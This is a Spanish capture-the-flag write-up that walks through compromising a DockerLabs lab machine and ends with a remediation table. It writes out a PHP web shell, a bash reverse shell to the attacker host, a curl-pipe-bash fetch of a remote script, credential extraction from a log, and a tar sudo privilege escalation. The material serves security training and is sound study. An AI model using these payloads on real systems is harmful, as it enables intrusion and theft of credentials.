# Forgotten Portal | Writeup.

**Plataforma:** DockerLabs · **Dificultad:** Media · **OS:** Linux  
**Metodología:** PTES · **Fecha:** 23/03/2026

---

## Entorno.

```bash
sudo bash auto_deploy.sh forgotten_portal.tar
```

![Inicialización de la máquina](/evidence/01_init-forgotten-portal-machine.png)
![Máquina desplegada](/evidence/02_forgotten-portal-machine-deployed.png)

- **Target:** `172.17.0.2`
- **Attacker:** `10.0.2.15`

![Verificación IP atacante](/evidence/03_checking-attacking-machine-ip.png)

---

## Reconocimiento.

```bash
nmap -p- -sVC --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

![Escaneo Nmap](/evidence/04_nmap-scanning.png)
![Resultados Nmap](/evidence/05_nmap-scanning-results.png)

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22 | SSH | OpenSSH 9.6p1 |
| 80 | HTTP | Apache 2.4.58 |

Puerto 80 como vector principal, no requiere credenciales.

---

## Análisis Web.

![Página web](/evidence/07_web-page.png)

Sin funcionalidad visible relevante. Se revisó el código fuente:

![Comentario en código fuente](/evidence/06_comment-on-html-code.png)

**Hallazgo crítico:** comentario HTML expone usuario `bob` y ruta oculta `m4ch1n3_upload.html`.

Navegando a la ruta descubierta:

![Formulario de subida](/evidence/08_web-form.png)

El formulario acepta `.txt`, `.pdf` y `.php`. Extensión `.php` en un servidor Apache = RCE.

### Enumeración de directorios.

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Gobuster](/evidence/09_gobuster-searching-directories.png)
![Directorio /uploads encontrado](/evidence/10_new-directory-found.png)

`/uploads` existe y es accesible, ahí vivirá el payload.

---

## Explotación.

### Web Shell.

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

![Web shell creada](/evidence/11_web-shell-created.png)

Subida a través del formulario:

![Web shell subida](/evidence/12_web-shell-uploaded.png)

Verificación de RCE:

```bash
curl http://172.17.0.2/uploads/shell.php?cmd=whoami
# www-data
```

![Confirmación curl](/evidence/13_curl-web-shell-confirm.png)

### Reverse Shell.

```bash
# Kali — payload
echo 'bash -i >& /dev/tcp/10.0.2.15/443 0>&1' > rev.sh
python3 -m http.server 8080

# Kali — listener
nc -nlvp 443
```

![Netcat escuchando](/evidence/14_netcat-listening-port.png)

```bash
# Desde la web shell
curl "http://172.17.0.2/uploads/shell.php?cmd=curl+http://10.0.2.15:8080/rev.sh|bash"
```

![Acceso como www-data](/evidence/15_access-as-www-data.png)

Estabilización:
```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Post-Explotación.

### Reconocimiento interno.

```bash
ls /home
```

![Carpetas de usuarios](/evidence/16_list-user-folders.png)

```bash
ls /var/www/html
```

![Archivos del servidor](/evidence/17_list-server-files.png)

```bash
cat /etc/passwd
```

![Usuarios del sistema](/evidence/18_search-users-information.png)

Usuarios con shell: `alice`, `bob`, `charlie`, `cyberland`, `ubuntu`. Ninguno accesible desde `www-data`.

### Credenciales en el log.

```bash
cat /var/www/html/access_log
```

![access_log con clave](/evidence/19_find-access-log-file.png)
![Clave en Base64](/evidence/20_base-64-key.png)

```bash
echo "YWxpY2U6czNjcjN0cEBzc3cwcmReNDg3" | base64 -d
# alice:s3cr3tp@ssw0rd^487
```

![Decodificación](/evidence/21_decode-base-64-key.png)

### Movimiento lateral → alice.

```bash
su alice
# s3cr3tp@ssw0rd^487
```

![Acceso como alice](/evidence/22_access-alice-user.png)

```bash
ls -la /home/alice
```

![Directorio de alice](/evidence/23_list-alice-user-directories.png)

En `incidents/report` se encontró:

- Clave `id_rsa` replicada en todos los usuarios del sistema
- Passphrase de bob: `cyb3r_s3curity`

![Información de la clave RSA](/evidence/24_id-rsa-key-information.png)

### Movimiento lateral → bob.

```bash
chmod 600 /home/alice/.ssh/id_rsa
ssh -i .ssh/id_rsa -o PreferredAuthentications=publickey bob@localhost
# Passphrase: cyb3r_s3curity
```

![Acceso como bob](/evidence/25_access-bob-user.png)

---

## Escalación de Privilegios.

```bash
sudo -l
# (ALL) NOPASSWD: /bin/tar
```

![Permisos sudo](/evidence/26_search-exe-files.png)

`tar` con sudo sin contraseña → [GTFOBins](https://gtfobins.github.io/gtfobins/tar/):

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
whoami
# root
```

![Acceso root](/evidence/27_access-root-user.png)

```bash
cat /root/root.txt
# CYBERLAND{r00t_4cc3ss_gr4nt3d}
```

![Flag de root](/evidence/28_capture-root-flag.png)

---

## Cadena de ataque.

Comentario HTML → ruta oculta
→ formulario .php → RCE via web shell
→ reverse shell como www-data
→ credenciales en Base64 en access_log → alice
→ clave RSA compartida + passphrase en reporte → bob
→ tar con sudo NOPASSWD → root

---

## Vulnerabilidades identificadas.

| Vulnerabilidad | Clasificación | Remediación |
|---|---|---|
| Información sensible en código fuente | CWE-615 | Eliminar comentarios antes de producción |
| File Upload sin restricción de extensiones | CWE-434 | Whitelist estricta, archivos fuera del webroot |
| Credenciales en texto casi plano en logs | CWE-312 | bcrypt/Argon2, nunca logs con credenciales |
| Clave SSH compartida entre usuarios | CWE-321 | Clave única por usuario |
| Sudo misconfiguration en binario tar | CWE-269 | Principio de mínimo privilegio |
| Directory listing habilitado en `/uploads` | CWE-548 | `Options -Indexes` en Apache, denegar acceso HTTP al directorio |
| Passphrase de la clave SSH en texto plano en un reporte interno | CWE-312 | Eliminar el archivo, gestor de secretos |

---

*Entorno controlado con fines académicos: Nodo EAFIT, Acelerador de Ciberseguridad.*  
*Writeup completo [aquí.](https://blog.luminaw.co/forgotten-portal-pentesting-dockerlabs/)*